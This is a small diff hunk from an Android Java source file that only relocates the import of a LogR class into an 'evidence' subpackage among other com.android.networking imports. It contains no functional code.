@@ -11,13 +11,13 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.evidence.Markup;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
